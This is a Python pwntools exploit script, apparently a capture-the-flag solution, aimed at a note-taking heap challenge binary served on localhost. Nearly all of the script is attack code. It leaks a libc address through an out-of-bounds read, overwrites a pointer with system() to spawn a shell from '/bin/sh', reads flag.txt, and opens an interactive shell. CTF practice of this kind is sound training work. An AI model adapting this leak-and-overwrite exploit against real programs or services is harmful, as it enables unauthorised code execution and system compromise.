#!/usr/bin/env python3
import sys, os
from pwn import *
context.update(
    arch="amd64",
    endian="little",
    os="linux",
    log_level="debug",
    terminal=["tmux", "split-window", "-h", "-p 65"],
)

REMOTE = False
TARGET= "./chall"
elf = ELF(TARGET)
HOST, PORT = 'localhost 11112'.split(' ')
libc = ELF("./libc.so.6")

def attach(p):
    if not REMOTE:
        bkps = []
        cmds = []
        gdb.attach(p, '\n'.join(["break {}".format(x) for x in bkps] + cmds))
    return

def add(index, size, data):
    p.sendlineafter(">> ", "1")
    p.sendlineafter("Page: ", str(index))
    p.sendlineafter("Lines: ", str(size//0x10))
    p.sendafter("Note: ", data)
    return

def edit(index, offset, data):
    p.sendlineafter(">> ", "2")
    p.sendlineafter("Page: ", str(index))
    p.sendlineafter("Line: ", str(offset//0x10))
    p.sendafter("Note: ", data)
    return

def show(index, offset):
    p.sendlineafter(b">> ", b"3")
    p.sendlineafter(b"Page: ", str(index).encode())
    p.sendlineafter(b"Line: ", str(offset//0x10).encode())
    return
    
def exploit(p):
    offset = 0x246088
    
    add(0, 0x100, b"/bin/sh\x00"*0x10)
    add(1, 0x28000, b"A"*0x10)
    show(1, offset)
    libc_base = u64(p.recv(6).ljust(8, b"\x00"))-0x1b32b0
    libc.address = libc_base
    log.info("libc_base: 0x{:x}".format(libc_base))
    system = libc.sym["system"]
    edit(1,offset, p64(system)+p64(system))
    show(0, 0)
    p.sendline("cat flag.txt")
    print(p.recv(0x100))
    p.interactive()
    return

if __name__ == "__main__":
    p = remote(HOST, PORT)
    exploit(p)
    exit(0)